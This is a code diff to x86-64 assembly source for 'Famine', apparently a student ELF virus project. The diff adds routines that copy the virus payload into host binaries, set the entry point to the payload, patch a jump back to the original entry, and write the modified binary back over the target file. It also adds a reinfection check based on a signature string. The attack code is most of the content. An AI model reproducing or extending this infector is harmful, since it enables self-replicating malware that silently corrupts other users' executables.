@@ -9,11 +9,18 @@ _start:
 
 memcpy:
 	enter 0, 0
+	mov rcx, rdx
+	cld
+	rep movsb
 	leave
 	ret
 
 memset:
 	enter 0, 0
+	mov rax, rsi
+	mov rcx, rdx
+	cld
+	rep stosb
 	leave
 	ret
 
@@ -256,7 +263,7 @@ modify_segements:
 		add r11, QWORD[rax + phdr.p_filesz]
 		mov rax, QWORD[rdi + phdr.p_offset]
 		cmp rax, r11
-		jg end_if_data_phdr2
+		jl end_if_data_phdr2
 			mov rax, QWORD[r8 + elf_struc.bits_added]
 			mov QWORD[rdi + phdr.p_offset], rax
 			mov rax, QWORD[rdi + phdr.p_vaddr]
@@ -354,8 +361,111 @@ fill_data_sec:
 
 rewrite_binary:
 	enter 0, 0
-	leave
-	ret
+	mov r11, rdi	;r11 contient elf_struc
+	mov rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
+	add rsi, QWORD[r11 + elf_struc.bits_added]
+	sub rsp, rsi	; nique sa mere mmap n'avait qu'a marcher
+	mov QWORD[r11 + elf_struc.new_bin_addr], rsp
+
+	mov rbx, QWORD[r11 + elf_struc.bits_added]
+	mov rax, QWORD[r11 + elf_struc.ehdr]
+	add QWORD[rax + ehdr.e_shoff], rbx			;e_shoff += bits_added
+	
+	mov rax, QWORD[r11 + elf_struc.ehdr]
+	mov rbx, QWORD[r11 + elf_struc.new_entry]
+	mov QWORD[rax + ehdr.e_entry], rbx			;e_entry = new_entry
+
+	mov rax, QWORD[r11 + elf_struc.data_phdr]
+	mov rbx, QWORD[r11 + elf_struc.bits_added]
+	add QWORD[rax + phdr.p_filesz], rbx			;dataphdr.p_filesz += bits_added
+
+	mov rbx, QWORD[rax + phdr.p_filesz]
+	mov QWORD[rax + phdr.p_memsz], rbx			;dataphdr.p_memsz = p_filesz
+
+	mov r13, 0									;bits written
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	mov rsi, QWORD[r11 + elf_struc.ptr]
+	mov rdx, QWORD[r11 + elf_struc.new_code_offset]
+	call memcpy											;copie du debut du bin
+	add r13, QWORD[r11 + elf_struc.new_code_offset]
+
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	add rdi, r13
+	mov rsi, 0
+	mov rdx, QWORD[r11 + elf_struc.bss_size]
+	call memset											;copie de la bss
+	add r13, QWORD[r11 + elf_struc.bss_size]
+
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	add rdi, r13
+	lea rsi, [rel _start]
+	mov rdx, PAYLOAD_SIZE
+	call memcpy											;copie du payload
+	add r13, PAYLOAD_SIZE
+
+	lea rbx, [rel jmp_old_entry]
+	lea rax, [rel end]
+	sub rax, rbx
+	sub rax, 2
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	add rdi, r13
+	sub rdi, rax								; addr to jump on old entry
+	mov rax, QWORD[r11 + elf_struc.new_entry]
+	sub rax, QWORD[r11 + elf_struc.old_entry]
+	mov QWORD[rdi], rax
+
+
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	add rdi, r13
+
+	mov rsi, QWORD[r11 + elf_struc.ehdr]
+	add rsi, QWORD[r11 + elf_struc.new_code_offset]
+
+	mov rdx, QWORD[r11 + elf_struc.stat + stat.st_size]
+	sub rdx, QWORD[r11 + elf_struc.new_code_offset]
+
+	add r13, rdx
+	call memcpy									;copi la fin du bin
+
+
+	;lea rdi, [rel data_name]
+	;mov rsi, 577
+	;mov rdx, 493
+	;mov rax, sys_open
+	;push r11
+	;syscall
+	;padding
+	;pop r11
+	;mov QWORD[r11 + elf_struc.fd2], rax
+	;cmp rax, 0
+	;jl ret_0					; open .data file
+
+	mov rdi, QWORD[r11 + elf_struc.path]
+	mov rsi, 513
+	mov rax, sys_open
+	push r11
+	syscall
+	padding
+	pop r11
+	mov QWORD[r11 + elf_struc.fd2], rax
+	cmp rax, 0
+	jl ret_0					; open the good file
+
+	mov rdi, rax
+	mov rsi, QWORD[r11 + elf_struc.new_bin_addr]
+	mov rdx, r13
+	mov rax, sys_write
+	push r11
+	syscall
+	padding
+	pop r11
+
+	mov rdi, QWORD[r11 + elf_struc.fd2]
+	mov rax, sys_close
+	syscall
+	padding
+
+	jmp ret_1
 
 infect_elf:		; r8:elf_struc
 	enter 0, 0
@@ -401,11 +511,28 @@ infect_elf:		; r8:elf_struc
 	cmp rax, 0
 	je infect_elf_end
 
+	mov rdi, QWORD[r8 + elf_struc.data_phdr]
+	mov rsi, QWORD[rdi + phdr.p_offset]
+	add rsi, QWORD[rdi + phdr.p_filesz]
+	mov rdi, QWORD[r8 + elf_struc.ptr]
+	add rdi, rsi
+	mov rsi, end - signature
+	sub rdi, rsi
+	lea rsi, [rel signature]
+	call strcmp							;test if infected
+	cmp rax, 0
+	je infect_elf_end
+
+
 	mov rdi, r8
 	call modify_sections
 
 	mov rdi, r8
+	push r8
 	call rewrite_binary
+	pop r8
+	cmp rax, 0
+	je infect_elf_end
 
 	mov rdi, QWORD[r8 + elf_struc.path]
 	call puts
@@ -449,8 +576,8 @@ process_file:
 	mov rax, sys_open
 	syscall						; opening the file
 	padding
-	mov DWORD[rsp + elf_struc.fd], eax
-	cmp eax, 0
+	mov QWORD[rsp + elf_struc.fd], rax
+	cmp rax, 0
 	jl process_file_end
 	mov rax, QWORD[rsp + elf_struc.stat + stat.st_size]
 	cmp rax, 0
@@ -461,7 +588,7 @@ process_file:
 	mov rdx, MMAP_PROT
 	mov r10, MAP_PRIVATE
 	xor r8, r8
-	mov r8d, DWORD[rsp + elf_struc.fd]
+	mov r8, QWORD[rsp + elf_struc.fd]
 	mov r9, 0
 	mov rax, sys_mmap
 	syscall						;mmap the file
@@ -654,6 +781,7 @@ main:
 	call process_dir
 	cmp rax, 1
 	je jmp_old_entry
+	print_nl
 	lea rdi, [rel dir1]
 	lea rsi, [rel process_file]
 	call process_dir
@@ -708,4 +836,6 @@ bss_name:
 	db ".bss", 0
 signature:
 	db 'Famine version 1.0 (c)oded by gdelabro', 0
+dqdqw:
+	db 'a'
 end:
